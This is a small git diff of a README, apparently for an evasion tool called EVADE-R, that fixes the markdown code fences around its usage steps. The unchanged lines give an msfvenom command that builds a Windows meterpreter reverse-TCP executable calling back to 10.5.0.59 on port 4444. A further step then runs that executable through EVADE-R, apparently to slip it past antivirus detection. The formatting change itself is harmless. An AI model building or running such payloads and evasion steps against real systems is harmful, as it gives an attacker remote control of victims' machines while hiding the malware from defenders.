@@ -61,8 +61,11 @@ chmod +x setup.sh run.sh
 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.5.0.59 LPORT=4444 -f exe -o payload.exe
+```
+
 Transform it with EVADE-R:
 
+```bash
 ./run.sh payload.exe
 ```
 
